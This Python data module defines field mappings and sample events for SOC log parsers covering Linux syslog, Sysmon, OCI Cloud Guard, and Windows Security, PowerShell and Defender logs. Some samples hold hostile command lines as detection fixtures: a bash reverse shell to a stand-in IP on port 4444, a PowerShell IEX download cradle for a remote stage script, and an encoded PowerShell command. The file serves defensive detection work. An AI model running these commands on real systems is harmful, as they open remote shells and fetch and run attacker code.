"""Static log-source/parser/field definitions (Linux/Windows/CloudGuard/Sysmon endpoint source + parser definitions).

Auto-extracted from setup_log_sources.py (behavior-preserving). Pure data — no
logic, no OCI calls.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from oci_config import COMPARTMENT_ID  # noqa: F401  (referenced by *_EXAMPLE payloads)


LINUX_PARSER_NAME = "socLinuxSyslogJsonParser"
LINUX_PARSER_DISPLAY = "SOC Linux Syslog JSON Parser"
LINUX_PARSER_DESC = (
    "Parses Linux syslog/auth JSON events for SOC detection rules. "
    "Maps msg, Process, Hostname, PID, Facility, Severity fields."
)
LINUX_FIELD_MAPPINGS = [
    # (display_name_or_builtin, json_path, sequence)
    ("msg",              "$.msg",        1),
    ("time",             "$.Timestamp",  2),
    ("Process Name",     "$.Process",    3),
    ("Host Name",        "$.Hostname",   4),
    ("Process ID",       "$.PID",        5),
    ("Facility",         "$.Facility",   6),
    ("Severity Level",   "$.Severity",   7),
    ("User",             "$.User",       8),
    ("Source IP",        "$.SourceIP",   9),
    ("Auth Method",      "$.AuthMethod", 10),
    ("Session Type",     "$.SessionType", 11),
    ("Command Line",     "$.CommandLine", 12),
]
LINUX_EXAMPLE = {
    "Timestamp": "2026-02-10T10:30:00.000Z",
    "Hostname": "web-prod-01",
    "Process": "sshd",
    "PID": 12345,
    "Facility": "auth",
    "Severity": "info",
    "User": "admin",
    "SourceIP": "xxx",
    "AuthMethod": "password",
    "SessionType": "ssh",
    "msg": "Failed password for admin from xxx port 54321 ssh2",
}

LINUX_SOURCE_INTERNAL = "socLinuxSyslogSource"
LINUX_SOURCE_DISPLAY = "SOC Linux Syslog Logs"
LINUX_SOURCE_DESC = (
    "Linux syslog and auth log events in JSON format for SOC detection rules."
)


# ─── Windows Sysmon Parser ──────────────────────────────────────

WINDOWS_PARSER_NAME = "socWindowsSysmonJsonParser"
WINDOWS_PARSER_DISPLAY = "SOC Windows Sysmon JSON Parser"
WINDOWS_PARSER_DESC = (
    "Parses Windows Sysmon JSON events for SOC detection rules. "
    "Maps core Sysmon Event 1 process fields and parent context."
)
WINDOWS_FIELD_MAPPINGS = [
    ("msg",                  "$.CommandLine",       1),
    ("time",                 "$.TimeCreated",       2),
    ("Utc Time",             "$.UtcTime",           3),
    ("Event ID",             "$.EventID",           4),
    ("Process ID",           "$.ProcessId",         5),
    ("Process Name",         "$.Image",             6),
    ("Command Line",         "$.CommandLine",       7),
    ("Current Directory",    "$.CurrentDirectory",  8),
    ("Parent Process Name",  "$.ParentImage",       9),
    ("Parent Command Line",  "$.ParentCommandLine", 10),
    ("Parent Process ID",    "$.ParentProcessId",   11),
    ("Original File Name",   "$.OriginalFileName",  12),
    ("Hashes",               "$.Hashes",            13),
    ("Logon ID",             "$.LogonId",           14),
    ("Logon Guid",           "$.LogonGuid",         15),
    ("Integrity Level",      "$.IntegrityLevel",    16),
    ("Process Guid",         "$.ProcessGuid",       17),
    ("Parent Process Guid",  "$.ParentProcessGuid", 18),
    ("Company",              "$.Company",           19),
    ("Product",              "$.Product",           20),
    ("Description",          "$.Description",       21),
    ("Host Name",            "$.Computer",          22),
    ("User",                 "$.User",              23),
    ("Channel",              "$.Channel",           24),
    ("Provider",             "$.Provider",          25),
    ("Source Process",       "$.SourceImage",       26),
    ("Target Process",       "$.TargetImage",       27),
    ("Target Filename",      "$.TargetFilename",    28),
    ("Target Object",        "$.TargetObject",      29),
    ("Granted Access",       "$.GrantedAccess",     30),
    ("Pipe Name",            "$.PipeName",          31),
    ("Destination Hostname", "$.DestinationHostname", 32),
    ("Destination IP",       "$.DestinationIp",     33),
    ("Destination Port",     "$.DestinationPort",   34),
    ("Host Name (Server)",   "$.Computer",          35),
]
WINDOWS_EXAMPLE = {
    "EventID": 1,
    "TimeCreated": "2026-02-10T10:30:00.000Z",
    "UtcTime": "2026-02-10T10:30:00.000Z",
    "Computer": "WS01.corp.local",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Provider": "Microsoft-Windows-Sysmon",
    "User": "CORP\\admin",
    "ProcessId": 2048,
    "ProcessGuid": "{AABBCCDD-1111-2222-3333-444455556666}",
    "Image": "C:\\Windows\\System32\\powershell.exe",
    "CommandLine": "powershell.exe -enc SQBFAFgA",
    "CurrentDirectory": "C:\\Windows\\System32\\",
    "Hashes": "SHA1=E4A1...,MD5=11AA...,SHA256=2F9D...",
    "LogonGuid": "{12345678-1111-2222-3333-ABCDEF123456}",
    "LogonId": "0x3e7",
    "IntegrityLevel": "High",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c powershell.exe -enc SQBFAFgA",
    "ParentProcessGuid": "{FFEEDDCC-AAAA-BBBB-CCCC-DDDDEEEEFFFF}",
    "ParentProcessId": 1024,
    "OriginalFileName": "powershell.exe",
    "Company": "Microsoft Corporation",
    "Product": "Microsoft Windows Operating System",
    "Description": "Windows PowerShell",
}

WINDOWS_SOURCE_INTERNAL = "socWindowsSysmonSource"
WINDOWS_SOURCE_DISPLAY = "SOC Windows Sysmon Logs"
WINDOWS_SOURCE_DESC = (
    "Windows Sysmon process creation events in JSON format for SOC detection rules."
)


# ─── Cloud Guard Parser ─────────────────────────────────────────

CG_PARSER_NAME = "socCloudGuardJsonParser"
CG_PARSER_DISPLAY = "SOC Cloud Guard JSON Parser"
CG_PARSER_DESC = (
    "Parses OCI Cloud Guard problem events (ProblemSummary-style JSON) for SOC detections."
)
CG_FIELD_MAPPINGS = [
    ("msg",              "$.problemName",        1),
    ("time",             "$.timeFirstDetected",  2),
    ("Problem Name",     "$.problemName",        3),
    ("Problem ID",       "$.id",                 4),
    ("Risk Level",       "$.riskLevel",          5),
    ("Risk Score",       "$.riskScore",          6),
    ("Resource Type",    "$.resourceType",       7),
    ("Resource ID",      "$.resourceId",         8),
    ("Resource Name",    "$.resourceName",       9),
    ("Host Name",        "$.resourceName",       10),
    ("Detector ID",      "$.detectorId",         11),
    ("Detector Rule ID", "$.detectorRuleId",     12),
    ("Region",           "$.region",             13),
    ("Lifecycle State",  "$.lifecycleState",     14),
]
CG_EXAMPLE = {
    "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    "compartmentId": COMPARTMENT_ID,
    "problemName": "BUCKET_IS_PUBLIC_READ",
    "resourceType": "Bucket",
    "resourceId": "ocid1.bucket.oc1..aaaaaaaaexample",
    "resourceName": "test-bucket-42",
    "riskLevel": "HIGH",
    "riskScore": 83,
    "detectorId": "ACTIVITY_DETECTOR",
    "detectorRuleId": "ocid1.cloudguarddetectorrecipe.oc1..aaaaaaaaexample",
    "region": "us-phoenix-1",
    "timeFirstDetected": "2026-02-10T10:30:00.000Z",
    "timeLastDetected": "2026-02-10T10:30:01.000Z",
    "lifecycleState": "ACTIVE",
}

CG_SOURCE_INTERNAL = "socCloudGuardSource"
CG_SOURCE_DISPLAY = "SOC Cloud Guard Logs"
CG_SOURCE_DESC = (
    "OCI Cloud Guard problem detection events in JSON format for SOC detection rules."
)


# ─── Cloud Guard Instance Security / OSQuery Result Parser ───────

CGIS_PARSER_NAME = "socCloudGuardInstanceSecurityJsonParser"
CGIS_PARSER_DISPLAY = "SOC Cloud Guard Instance Security JSON Parser"
CGIS_PARSER_DESC = (
    "Parses Cloud Guard Instance Security and OSQuery result logs. "
    "Keeps workload host findings separate from Cloud Guard problem events and Octo APM demo telemetry."
)
CGIS_FIELD_MAPPINGS = [
    ("msg",                         "$.message",              1),
    ("time",                        "$.timestamp",            2),
    ("Host Name",                   "$.hostname",             3),
    ("Instance OCID",               "$.instanceOcid",         4),
    ("Instance OCID",               "$.cloud.instance.id",    5),
    ("Region",                      "$.region",               6),
    ("Risk Level",                  "$.riskLevel",            7),
    ("Security Severity",           "$.severity",             8),
    ("Finding Severity",            "$.severity",             9),
    ("Finding Status",              "$.status",              10),
    ("Finding ID",                  "$.findingId",           11),
    ("Finding Name",                "$.findingName",         12),
    ("Instance Security Problem ID", "$.problemId",          13),
    ("Instance Security Rule ID",   "$.ruleId",              14),
    ("Pack Name",                   "$.pack.name",           15),
    ("Pack Query ID",               "$.pack.query_id",       16),
    ("Pack Query Name",             "$.pack.query_name",     17),
    ("OSQuery Query",               "$.osquery.query",       18),
    ("OSQuery SQL",                 "$.osquery.sql",         19),
    ("OSQuery Finding",             "$.osquery.finding",     20),
    ("OSQuery Result Count",        "$.osquery.result_count", 21),
    ("Process Name",                "$.process.name",        22),
    ("Process Command Line",        "$.process.command_line", 23),
    ("File Path",                   "$.file.path",           24),
    ("Source IP",                   "$.source.ip",           25),
    ("Destination IP",              "$.destination.ip",      26),
    ("Destination Port",            "$.destination.port",    27),
    ("MITRE Tactic",                "$.mitre.tactic",        28),
    ("MITRE Technique ID",          "$.mitre.technique_id",  29),
    ("MITRE Technique",             "$.mitre.technique",     30),
    ("Log Type",                    "$.logType",             31),
]
CGIS_EXAMPLE = {
    "timestamp": "2026-05-28T10:30:00.000Z",
    "message": "OSQuery detected a suspicious listening process on an OCI compute instance",
    "hostname": "oke-worker-01",
    "instanceOcid": "ocid1.instance.oc1..example",
    "cloud.instance.id": "ocid1.instance.oc1..example",
    "region": "us-ashburn-1",
    "riskLevel": "HIGH",
    "severity": "critical",
    "status": "open",
    "findingId": "finding-osquery-listener-001",
    "findingName": "Unexpected Listener",
    "problemId": "cgis-problem-001",
    "ruleId": "cgis-rule-osquery-unexpected-listener",
    "pack": {
        "name": "network-exposure",
        "query_id": "unexpected_listeners",
        "query_name": "Unexpected listeners",
    },
    "osquery": {
        "query": "unexpected_listeners",
        "sql": "SELECT pid, port, protocol FROM listening_ports;",
        "finding": "Process bash opened a listener on 0.0.0.0:4444",
        "result_count": 1,
    },
    "process": {
        "name": "bash",
        "command_line": "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1",
    },
    "file": {"path": "/tmp/boopkit"},
    "source": {"ip": "10.0.10.42"},
    "destination": {"ip": "198.51.100.77", "port": 4444},
    "mitre": {"tactic": "Command and Control", "technique_id": "T1095", "technique": "Non-Application Layer Protocol"},
    "logType": "cloud_guard_instance_security",
}

CGIS_SOURCE_INTERNAL = "socCloudGuardInstanceSecuritySource"
CGIS_SOURCE_DISPLAY = "SOC Cloud Guard Instance Security Logs"
CGIS_SOURCE_DESC = (
    "Cloud Guard Instance Security and OSQuery result logs for workload runtime posture and host findings."
)
OSQUERY_SOURCE_INTERNAL = "socOsqueryResultSource"
OSQUERY_SOURCE_DISPLAY = "SOC OSQuery Result Logs"
OSQUERY_SOURCE_DESC = (
    "OSQuery pack result logs for endpoint state findings. Raw OSQuery SQL is not executed by Log Analytics."
)


# ─── Windows Event Security Parser (multicloudoperations compat) ─

WINSEC_PARSER_NAME = "socWinEventSecurityJsonParser"
WINSEC_PARSER_DISPLAY = "SOC Windows Event Security JSON Parser"
WINSEC_PARSER_DESC = (
    "Parses Windows Security Event Log JSON for multicloudoperations widgets. "
    "Maps Event ID, User, Host Name (Server), Source Address, Logon Type."
)
WINSEC_FIELD_MAPPINGS = [
    ("msg",                     "$.msg",                    1),
    ("time",                    "$.TimeCreated",            2),
    ("Event ID",                "$.EventID",                3),
    ("User",                    "$.User",                   4),
    ("Host Name (Server)",      "$.Computer",               5),
    ("Source Address",          "$.SourceAddress",          6),
    ("Logon Type",              "$.LogonType",              7),
    ("Process Name",            "$.ProcessName",            8),
    ("Command Line",            "$.CommandLine",            9),
    ("Host Name",               "$.Computer",              10),
    ("Process",                 "$.ProcessName",           11),
    # Advanced auth/Kerberos/privilege fields. Synthetic generators emit
    # these as top-level JSON keys so detections for events 4648/4672/4768/
    # 4769/4770 (kerberoasting, golden ticket, pass-the-ticket, sensitive
    # privilege use) have searchable columns.
    ("Subject User Name",       "$.SubjectUserName",       12),
    ("Target User Name",        "$.TargetUserName",        13),
    ("Target Domain Name",      "$.TargetDomainName",      14),
    ("Ticket Encryption Type",  "$.TicketEncryptionType",  15),
    ("Ticket Options",          "$.TicketOptions",         16),
    ("Privilege List",          "$.PrivilegeList",         17),
    ("Target Server Name",      "$.TargetServerName",      18),
    ("Service Information",     "$.ServiceInformation",    19),
    ("Service Name",            "$.ServiceName",           20),
    # DCSync (event 4662): Properties holds the AD attribute GUIDs being replicated.
    ("Object Server",           "$.ObjectServer",          21),
    ("Object Type",             "$.ObjectType",            22),
    ("Properties",              "$.Properties",            23),
    ("Object Name",             "$.ObjectName",            24),
    ("Access Mask",             "$.AccessMask",            25),
    ("Failure Reason",          "$.FailureReason",         26),
    ("Status",                  "$.Status",                27),
    ("Sub Status",              "$.SubStatus",             28),
    ("Task Name",               "$.TaskName",              29),
    ("Share Name",              "$.ShareName",             30),
    ("Relative Target Name",    "$.RelativeTargetName",    31),
    ("Service File Name",       "$.ServiceFileName",       32),
]
WINSEC_EXAMPLE = {
    "EventID": "4769",
    "TimeCreated": "2026-02-11T10:30:00.000Z",
    "Computer": "DC01.sevenkingdoms.local",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "User": "joffrey",
    "SubjectUserName": "joffrey",
    "TargetUserName": "MSSQLSvc/sql01.sevenkingdoms.local",
    "TargetDomainName": "SEVENKINGDOMS",
    "ServiceName": "MSSQLSvc",
    "TicketEncryptionType": "0x17",
    "TicketOptions": "0x40810000",
    "PrivilegeList": "SeSecurityPrivilege",
    "TargetServerName": "sql01.sevenkingdoms.local",
    "ServiceInformation": "MSSQLSvc/sql01.sevenkingdoms.local",
    "ObjectName": "\\\\DC01\\C$\\Windows\\Temp\\payload.exe",
    "AccessMask": "0x12019f",
    "FailureReason": "0xC000006D",
    "Status": "0xC000006D",
    "SubStatus": "0xC000006A",
    "TaskName": "\\Microsoft\\Windows\\Update\\CacheTask",
    "ShareName": "\\\\*\\C$",
    "RelativeTargetName": "Windows\\Temp\\payload.exe",
    "ServiceFileName": "C:\\Windows\\Temp\\payload.exe",
    "SourceAddress": "192.168.1.50",
    "LogonType": "3",
    "ProcessName": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "",
    "msg": "A Kerberos service ticket was requested.",
}

WINSEC_SOURCE_INTERNAL = "socWinEventSecuritySource"
WINSEC_SOURCE_DISPLAY = "Windows Event Security Logs"
WINSEC_SOURCE_DESC = (
    "Windows Security Event Log events in JSON format for SOC and multicloud widgets."
)


# ─── Windows Event System Parser (multicloudoperations compat) ───

WINSYS_PARSER_NAME = "socWinEventSystemJsonParser"
WINSYS_PARSER_DISPLAY = "SOC Windows Event System JSON Parser"
WINSYS_PARSER_DESC = (
    "Parses Windows System Event Log JSON for multicloudoperations widgets. "
    "Maps Event ID, Host Name (Server), Service Name."
)
WINSYS_FIELD_MAPPINGS = [
    ("msg",                  "$.msg",              1),
    ("time",                 "$.TimeCreated",      2),
    ("Event ID",             "$.EventID",          3),
    ("Host Name (Server)",   "$.Computer",         4),
    ("Host Name",            "$.Computer",         5),
    ("Service Name",         "$.ServiceName",      6),
    ("User",                 "$.User",             7),
    ("Service File Name",    "$.ServiceFileName",  8),
]
WINSYS_EXAMPLE = {
    "EventID": "7045",
    "TimeCreated": "2026-02-11T10:30:00.000Z",
    "Computer": "SRV01.sevenkingdoms.local",
    "Channel": "System",
    "Provider": "Service Control Manager",
    "ServiceName": "backdoor_svc",
    "ServiceFileName": "C:\\Windows\\Temp\\agent.exe",
    "User": "SYSTEM",
    "msg": "A service was installed in the system.",
}

WINSYS_SOURCE_INTERNAL = "socWinEventSystemSource"
WINSYS_SOURCE_DISPLAY = "Windows Event System Logs"
WINSYS_SOURCE_DESC = (
    "Windows System Event Log events in JSON format for SOC and multicloud widgets."
)


# ─── Windows PowerShell Operational Parser ──────────────────────

WINPS_PARSER_NAME = "socWinPowerShellOperationalJsonParser"
WINPS_PARSER_DISPLAY = "SOC Windows PowerShell Operational JSON Parser"
WINPS_PARSER_DESC = (
    "Parses Microsoft-Windows-PowerShell/Operational JSON events for script block and module logging detections."
)
WINPS_FIELD_MAPPINGS = [
    ("msg",                    "$.msg",              1),
    ("time",                   "$.TimeCreated",      2),
    ("Event ID",               "$.EventID",          3),
    ("Host Name (Server)",     "$.Computer",         4),
    ("Host Name",              "$.Computer",         5),
    ("User",                   "$.User",             6),
    ("Provider",               "$.Provider",         7),
    ("Channel",                "$.Channel",          8),
    ("Script Block Text",      "$.ScriptBlockText",  9),
    ("Command Line",           "$.CommandLine",     10),
    ("Host Application",       "$.HostApplication", 11),
    ("Process Name",           "$.ProcessName",     12),
]
WINPS_EXAMPLE = {
    "EventID": "4104",
    "TimeCreated": "2026-05-29T10:30:00.000Z",
    "Computer": "WS01.sevenkingdoms.local",
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Provider": "Microsoft-Windows-PowerShell",
    "User": "arya",
    "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('https://example.invalid/stage.ps1')",
    "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass",
    "HostApplication": "powershell.exe -NoProfile -ExecutionPolicy Bypass",
    "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "msg": "Suspicious PowerShell script block logged.",
}

WINPS_SOURCE_INTERNAL = "socWinPowerShellOperationalSource"
WINPS_SOURCE_DISPLAY = "Windows PowerShell Operational Logs"
WINPS_SOURCE_DESC = (
    "PowerShell operational script block and module logging events in JSON format for SOC detections."
)


# ─── Windows Defender Operational Parser ────────────────────────

WINDEF_PARSER_NAME = "socWindowsDefenderOperationalJsonParser"
WINDEF_PARSER_DISPLAY = "SOC Windows Defender Operational JSON Parser"
WINDEF_PARSER_DESC = (
    "Parses Microsoft-Windows-Windows Defender/Operational JSON events for malware, remediation, and tamper signals."
)
WINDEF_FIELD_MAPPINGS = [
    ("msg",                    "$.msg",              1),
    ("time",                   "$.TimeCreated",      2),
    ("Event ID",               "$.EventID",          3),
    ("Host Name (Server)",     "$.Computer",         4),
    ("Host Name",              "$.Computer",         5),
    ("User",                   "$.User",             6),
    ("Provider",               "$.Provider",         7),
    ("Channel",                "$.Channel",          8),
    ("Threat Name",            "$.ThreatName",       9),
    ("Threat ID",              "$.ThreatID",        10),
    ("Action",                 "$.Action",          11),
    ("Status",                 "$.Status",          12),
    ("Severity",               "$.Severity",        13),
    ("Detection Source",       "$.DetectionSource", 14),
    ("File Path",              "$.FilePath",        15),
]
WINDEF_EXAMPLE = {
    "EventID": "1116",
    "TimeCreated": "2026-05-29T10:35:00.000Z",
    "Computer": "WS02.sevenkingdoms.local",
    "Channel": "Microsoft-Windows-Windows Defender/Operational",
    "Provider": "Microsoft-Windows-Windows Defender",
    "User": "SYSTEM",
    "ThreatName": "Trojan:Win32/Example",
    "ThreatID": "2147712345",
    "Action": "Detected",
    "Status": "Active",
    "Severity": "High",
    "DetectionSource": "Real-Time Protection",
    "FilePath": "C:\\Users\\Public\\stage.exe",
    "msg": "Microsoft Defender Antivirus detected malware.",
}

WINDEF_SOURCE_INTERNAL = "socWindowsDefenderOperationalSource"
WINDEF_SOURCE_DISPLAY = "Windows Defender Operational Logs"
WINDEF_SOURCE_DESC = (
    "Microsoft Defender Antivirus operational events in JSON format for SOC detections."
)


# ─── Linux Secure Parser (multicloudoperations compat) ───────────

LINSEC_PARSER_NAME = "socLinuxSecureJsonParser"
LINSEC_PARSER_DISPLAY = "SOC Linux Secure JSON Parser"
LINSEC_PARSER_DESC = (
    "Parses Linux auth/secure log JSON for multicloudoperations widgets. "
    "Maps Process, User, Source IP, Host Name (Server), Auth Method."
)
LINSEC_FIELD_MAPPINGS = [
    ("msg",                  "$.msg",              1),
    ("time",                 "$.Timestamp",        2),
    ("Process",              "$.Process",          3),
    ("Process Name",         "$.Process",          4),
    ("User",                 "$.User",             5),
    ("Host Name (Server)",   "$.Hostname",         6),
    ("Host Name",            "$.Hostname",         7),
    ("Source Address",       "$.SourceIP",         8),
    ("Source IP",            "$.SourceIP",         9),
    ("Auth Method",          "$.AuthMethod",      10),
    ("Process ID",           "$.PID",             11),
    ("Facility",             "$.Facility",        12),
    ("Severity Level",       "$.Severity",        13),
    ("Endpoint OS",          "$.EndpointOS",      14),
    ("Command Line",         "$.CommandLine",     15),
]
LINSEC_EXAMPLE = {
    "EndpointOS": "Linux",
    "Timestamp": "2026-02-11T10:30:00.000Z",
    "Hostname": "web-prod-01",
    "Process": "sshd",
    "PID": 12345,
    "Facility": "auth",
    "Severity": "info",
    "msg": "Failed password for admin from xxxxx port 54321 ssh2",
    "SourceIP": "xxx",
    "User": "admin",
    "AuthMethod": "password",
    "SessionType": "ssh",
}

LINSEC_SOURCE_INTERNAL = "socLinuxSecureSource"
LINSEC_SOURCE_DISPLAY = "Linux Secure Logs"
LINSEC_SOURCE_DESC = (
    "Linux auth/secure log events in JSON format for SOC and multicloud widgets."
)


# ─── Windows Sysmon Operational Parser (multicloudoperations) ────

SYSMON_PARSER_NAME = "socSysmonOperationalJsonParser"
SYSMON_PARSER_DISPLAY = "SOC Sysmon Operational JSON Parser"
SYSMON_PARSER_DESC = (
    "Parses Windows Sysmon Operational JSON for multicloudoperations widgets. "
    "Maps Sysmon fields: SourceImage, TargetImage, DestinationIp, QueryName."
)
SYSMON_FIELD_MAPPINGS = [
    ("msg",                  "$.msg",                  1),
    ("time",                 "$.TimeCreated",           2),
    ("Event ID",             "$.EventID",               3),
    ("Host Name (Server)",   "$.Computer",              4),
    ("Host Name",            "$.Computer",              5),
    ("User",                 "$.User",                  6),
    ("Source Process",       "$.SourceImage",           7),
    ("Target Process",       "$.TargetImage",           8),
    ("Endpoint OS",          "$.EndpointOS",            9),
    ("Destination Hostname", "$.DestinationHostname",  10),
    ("Destination IP",       "$.DestinationIp",        11),
    ("Destination Port",     "$.DestinationPort",      12),
    ("Query Name",           "$.QueryName",            13),
    ("Query Results",        "$.QueryResults",         14),
    ("Pipe Name",            "$.PipeName",             15),
    ("Target Filename",      "$.TargetFilename",       16),
    ("Granted Access",       "$.GrantedAccess",        17),
    ("Process Name",         "$.SourceImage",          18),
    ("Command Line",         "$.CommandLine",          19),
    ("Target Object",        "$.TargetObject",         20),
    ("Parent Process Name",  "$.ParentImage",          21),
]
SYSMON_EXAMPLE = {
    "EndpointOS": "Windows",
    "EventID": 1,
    "TimeCreated": "2026-02-11T10:30:00.000Z",
    "Computer": "WS01.sevenkingdoms.local",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Provider": "Microsoft-Windows-Sysmon",
    "User": "joffrey",
    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "cmd.exe /c whoami",
    "DestinationHostname": "evil-c2.duckdns.org",
    "DestinationIp": "xxx",
    "DestinationPort": 443,
    "QueryName": "evil-c2.duckdns.org",
    "QueryResults": "xxx",
    "PipeName": "",
    "TargetFilename": "",
    "GrantedAccess": "0x1010",
    "msg": "Process Create: cmd.exe /c whoami",
}

SYSMON_SOURCE_INTERNAL = "socSysmonOperationalSource"
SYSMON_SOURCE_DISPLAY = "Windows Sysmon Operational Logs"
SYSMON_SOURCE_DESC = (
    "Windows Sysmon operational events in JSON format for SOC and multicloud widgets."
)


# ─── Sysmon Network Connection Parser (Event ID 3) ───────────

SYSNET_PARSER_NAME = "socSysmonNetworkJsonParser"
SYSNET_PARSER_DISPLAY = "SOC Sysmon Network JSON Parser"
SYSNET_PARSER_DESC = (
    "Parses Windows Sysmon Event ID 3 (network connection) JSON. "
    "Maps Protocol, SourceIp, SourcePort, DestinationIp, DestinationPort, Image."
)
SYSNET_FIELD_MAPPINGS = [
    ("msg",                  "$.msg",               1),
    ("time",                 "$.@timestamp",         2),
    ("Event ID",             "$.EventID",            3),
    ("Host Name",            "$.Computer",           4),
    ("Process Name",         "$.Image",              5),
    ("Protocol",             "$.Protocol",           6),
    ("Destination IP",       "$.DestinationIp",      7),
    ("Destination Port",     "$.DestinationPort",    8),
    ("Source IP",            "$.SourceIp",           9),
    ("Source Port",          "$.SourcePort",        10),
    ("Initiated",            "$.Initiated",         11),
    ("Destination Hostname", "$.DestinationHostname", 12),
    ("User",                 "$.User",              13),
    ("Source Process",       "$.Image",             14),
    ("RuleName",             "$.RuleName",          15),
    ("Technique Name",       "$.TechniqueName",     16),
    ("Technique ID",         "$.TechniqueId",       17),
    ("Account Name",         "$.AccountName",       18),
    ("Event Channel",        "$.Channel",           19),
]
SYSNET_EXAMPLE = {
    "@timestamp": "2026-02-11T10:30:00.000Z",
    "EventID": 3,
    "Computer": "WS01.corp.local",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "User": "CORP\\admin",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "Protocol": "tcp",
    "DestinationIp": "xxx",
    "DestinationPort": 443,
    "DestinationHostname": "evil-c2.example.com",
    "SourceIp": "10.0.1.50",
    "SourcePort": 54321,
    "Initiated": "true",
    "RuleName": "technique_id=T1071,technique_name=Application Layer Protocol",
    "TechniqueName": "Application Layer Protocol",
    "TechniqueId": "T1071",
    "AccountName": "admin",
    "msg": "Network connection detected: cmd.exe -> xxx",
}

SYSNET_SOURCE_INTERNAL = "socSysmonNetworkSource"
SYSNET_SOURCE_DISPLAY = "SOC Sysmon Network Logs"
SYSNET_SOURCE_DESC = (
    "Windows Sysmon Event ID 3 (network connection) events in JSON format for SOC network detections."
)


# ─── OCI WAF Security Log Parser ──────────────────────────────
